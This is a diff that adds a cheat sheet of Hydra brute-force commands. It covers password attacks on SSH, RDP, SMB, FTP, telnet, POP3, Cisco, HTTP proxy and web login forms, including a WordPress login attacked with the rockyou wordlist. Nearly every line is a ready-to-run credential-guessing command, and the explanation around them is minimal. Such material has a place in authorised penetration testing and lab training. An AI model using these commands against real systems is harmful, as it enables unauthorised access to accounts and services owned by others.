@@ -1,0 +1,39 @@
+hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV] server service [OPT]
+
+    Using hydra to crack ssh
+    hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh
+    Using hydra to crack https：
+    # hydra -m /index.php -l username -P pass.txt IP https
+    Using hydra to crack teamspeak：
+    # hydra -l username -P wordlist -s portnumber -vV ip teamspeak
+    Using hydra to crack cisco：
+    # hydra -P pass.txt IP cisco
+    # hydra -m cloud -P pass.txt 192.168.1.11 cisco-enable
+    Using hydra to crack smb：
+    # hydra -l administrator -P pass.txt IP smb
+    Using hydra to crack pop3：
+    # hydra -l muts -P pass.txt my.pop3.mail pop3
+    Using hydra to crack rdp：
+    # hydra IP rdp -l administrator -P pass.txt -V
+    Using hydra to crack http-proxy：
+    # hydra -l admin -P pass.txt http-proxy://192.168.1.111
+    Using hydra to crack telnet
+    # hydra IP telnet -l username -P wordlist -t 32 -s 23 -e ns -f -V
+    Using hydra to crack ftp：
+    # hydra IP ftp -l username -P wordlist -t thread(default 16) -vV
+    # hydra IP ftp -l username -P wordlist -e ns -vV
+    GET REQUEST，crack web login：
+    # hydra -l username -p wordlist -t thread -vV -e ns IP http-get /admin/
+    # hydra -l username -p wordlist -t thread -vV -e ns -f IP http-get /admin/index.php
+    POST REQUEST，crack web login：
+    Example, web form
+    <form action=”index.php” method=”POST”>
+    <input type=”text” name=”name” /><br><br>
+    <input type=”password” name=”pwd” /><br><br>
+    <input type=”submit” name=”sub” value=”submit”>
+    </form>
+    Command：
+    # hydra -l admin -P pass.lst -o ok.lst -t 1 -f 127.0.0.1 http-post-form “index.php:name=^USER^&pwd=^PASS^:<title>invalido</title>”
+    Hydra on wordress login bruteforce...
+    # hydra -L users -P /usr/share/wordlists/rockyou.txt lemonsqueezy http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:incorrect"
+
